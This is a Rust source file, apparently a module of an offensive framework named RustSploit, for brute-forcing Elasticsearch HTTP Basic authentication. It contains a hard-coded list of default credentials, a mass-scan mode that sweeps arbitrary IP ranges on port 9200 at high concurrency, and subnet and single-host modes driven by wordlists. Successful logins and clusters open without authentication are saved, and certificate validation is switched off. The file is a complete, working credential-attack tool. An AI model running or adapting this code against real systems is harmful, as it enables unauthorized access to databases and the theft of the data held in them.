use anyhow::{anyhow, Result};
use colored::*;
use reqwest::ClientBuilder;
use std::{io::Write, net::IpAddr, sync::Arc, time::Duration};

use crate::modules::creds::utils::{
    generate_combos, is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// Constants
const DEFAULT_ES_PORT: u16 = 9200;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("elastic", "elastic"),
    ("elastic", "changeme"),
    ("admin", "admin"),
    ("elastic", "password"),
    ("kibana", "kibana"),
    ("elastic", ""),
    ("admin", "password"),
    ("admin", ""),
    ("root", "root"),
    ("logstash_system", "logstash_system"),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Elasticsearch Brute Force".to_string(),
        description: "Brute-force Elasticsearch HTTP Basic authentication. Tests credentials \
            against the cluster root endpoint and security API. Supports default credential \
            testing, combo mode, concurrent connections, and subnet/mass scanning."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Elasticsearch Brute Force Module                        ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   HTTP Basic Auth Credential Testing (port 9200)          ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} — Mass Scan Mode", target).yellow()
        );
        // Build client ONCE and share — avoids OOM from per-host client creation
        let mass_client = Arc::new(
            reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(5))
                .build()
                .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?,
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "Elasticsearch",
                default_port: 9200,
                state_file: "elasticsearch_hose_state.log",
                default_output: "elasticsearch_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| {
                let client = mass_client.clone();
                async move {
                let client = &*client;

                // Check if port responds with Elasticsearch JSON
                let url = format!("http://{}:{}/", ip, port);
                let resp = client.get(&url).send().await.ok()?;
                let body = resp.text().await.ok()?;
                if !body.contains("cluster_name") {
                    return None;
                }

                // Port is open and running Elasticsearch — try default creds
                let creds = [
                    ("elastic", "elastic"),
                    ("elastic", "changeme"),
                    ("admin", "admin"),
                    ("elastic", "password"),
                    ("elastic", ""),
                ];
                for (user, pass) in creds {
                    let auth_url = format!("http://{}:{}/_security/_authenticate", ip, port);
                    let req = client.get(&auth_url).basic_auth(user, Some(pass));
                    if let Ok(r) = req.send().await {
                        if r.status().as_u16() == 200 {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            {
                                let id = crate::cred_store::store_credential(
                                    &ip.to_string(),
                                    port,
                                    "elasticsearch",
                                    user,
                                    pass,
                                    crate::cred_store::CredType::Password,
                                    "creds/generic/elasticsearch_bruteforce",
                                )
                                .await;
                                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                            }
                            return Some(format!(
                                "[{}] {}:{}:{}:{}\n",
                                ts, ip, port, user, pass
                            ));
                        }
                    }
                }

                // If none of the creds worked but ES responded, it might be open (no auth)
                let check_url = format!("http://{}:{}/", ip, port);
                if let Ok(r) = client.get(&check_url).send().await {
                    if r.status().as_u16() == 200 {
                        if let Ok(b) = r.text().await {
                            if b.contains("cluster_name") {
                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                return Some(format!(
                                    "[{}] {}:{} Elasticsearch open (no auth required)\n",
                                    ts, ip, port
                                ));
                            }
                        }
                    }
                }

                None
            }},
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "Elasticsearch Port", DEFAULT_ES_PORT).await?;

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Password wordlist is empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "elasticsearch_subnet_results.txt",
        )
        .await?;

        let timeout_secs: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
            input.parse::<u64>().unwrap_or(10).max(1).min(300)
        };
        let timeout_duration = Duration::from_secs(timeout_secs);

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "elasticsearch",
                source_module: "creds/generic/elasticsearch_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let timeout_dur = timeout_duration;
                async move {
                    let base_url = format!("http://{}:{}", ip, port);
                    match try_es_login(&base_url, &user, &pass, timeout_dur).await {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => LoginResult::Error {
                            message: e.to_string(),
                            retryable: true,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "Elasticsearch Port", DEFAULT_ES_PORT).await?;

    // Ask about default credentials
    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10").await?;
        input.parse::<u64>().unwrap_or(10).max(1).min(300)
    };

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file(
                "output_file",
                "Output file",
                "elasticsearch_brute_results.txt",
            )
            .await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_mode = cfg_prompt_yes_no(
        "combo_mode",
        "Combination mode? (try every pass with every user)",
        false,
    )
    .await?;

    let normalized = normalize_target(target)?;
    let connect_addr = format!("{}:{}", normalized, port);

    crate::mprintln!(
        "\n{}",
        format!("[*] Starting brute-force on {}", connect_addr).cyan()
    );

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!(
                "[*] Added {} default credentials",
                DEFAULT_CREDENTIALS.len()
            )
            .green()
        );
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let combos = generate_combos(&usernames, &passwords, combo_mode);
    let timeout_duration = Duration::from_secs(connection_timeout);

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let timeout_dur = timeout_duration;
        async move {
            let base_url = format!("http://{}:{}", t, p);
            match try_es_login(&base_url, &user, &pass, timeout_dur).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error {
                    message: e.to_string(),
                    retryable: true,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "elasticsearch",
            source_module: "creds/generic/elasticsearch_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored Elasticsearch responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "elasticsearch_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# Elasticsearch Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

/// Attempt Elasticsearch login via HTTP Basic Auth.
///
/// Checks the `/_security/_authenticate` endpoint first (Elasticsearch security API).
/// Falls back to the cluster root endpoint `/` and looks for `cluster_name` in the
/// JSON response to confirm authenticated access.
///
/// Returns:
/// - `Ok(true)` — authentication succeeded
/// - `Ok(false)` — credentials rejected (401)
/// - `Err(_)` — connection/timeout/protocol error
async fn try_es_login(
    base_url: &str,
    username: &str,
    password: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(timeout_duration)
        .build()
        .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

    // Try the security authenticate endpoint first
    let auth_url = format!("{}/_security/_authenticate", base_url);
    let auth_resp = match tokio::time::timeout(
        timeout_duration,
        client.get(&auth_url).basic_auth(username, Some(password)).send(),
    )
    .await
    {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => {
            // Connection error — fall through to root endpoint check
            let err_str = e.to_string();
            if err_str.contains("Connection refused") || err_str.contains("connect") {
                return Err(anyhow!("Connection refused: {}", err_str));
            }
            // Try root endpoint as fallback
            return try_es_root_login(base_url, username, password, &client, timeout_duration).await;
        }
        Err(_) => return Err(anyhow!("Connection timeout")),
    };

    let status = auth_resp.status().as_u16();

    match status {
        200 => {
            // Verify we got a valid JSON response with authentication info
            let body = match tokio::time::timeout(timeout_duration, auth_resp.text()).await {
                Ok(Ok(b)) => b,
                Ok(Err(e)) => return Err(anyhow!("Failed to read response: {}", e)),
                Err(_) => return Err(anyhow!("Timeout reading response")),
            };
            if body.contains("username") || body.contains("roles") || body.contains("enabled") {
                return Ok(true);
            }
            // Got 200 but unexpected body — try root endpoint
            return try_es_root_login(base_url, username, password, &client, timeout_duration).await;
        }
        401 => return Ok(false),
        403 => {
            // 403 could mean valid creds but insufficient privileges for security API
            // Try root endpoint as fallback
            return try_es_root_login(base_url, username, password, &client, timeout_duration).await;
        }
        404 => {
            // Security plugin not installed — try root endpoint
            return try_es_root_login(base_url, username, password, &client, timeout_duration).await;
        }
        _ => {
            return try_es_root_login(base_url, username, password, &client, timeout_duration).await;
        }
    }
}

/// Fallback: try authenticating against the Elasticsearch root endpoint `/`.
/// A successful auth returns JSON with `cluster_name`.
async fn try_es_root_login(
    base_url: &str,
    username: &str,
    password: &str,
    client: &reqwest::Client,
    timeout_duration: Duration,
) -> Result<bool> {
    let root_url = format!("{}/", base_url);
    let resp = match tokio::time::timeout(
        timeout_duration,
        client.get(&root_url).basic_auth(username, Some(password)).send(),
    )
    .await
    {
        Ok(Ok(r)) => r,
        Ok(Err(e)) => return Err(anyhow!("Connection error: {}", e)),
        Err(_) => return Err(anyhow!("Connection timeout")),
    };

    let status = resp.status().as_u16();

    match status {
        200 => {
            let body = match tokio::time::timeout(timeout_duration, resp.text()).await {
                Ok(Ok(b)) => b,
                Ok(Err(e)) => return Err(anyhow!("Failed to read response: {}", e)),
                Err(_) => return Err(anyhow!("Timeout reading response")),
            };
            // Elasticsearch root returns JSON with cluster_name when authenticated
            if body.contains("cluster_name") {
                Ok(true)
            } else {
                Ok(false)
            }
        }
        401 => Ok(false),
        _ => Err(anyhow!("Unexpected HTTP status: {}", status)),
    }
}
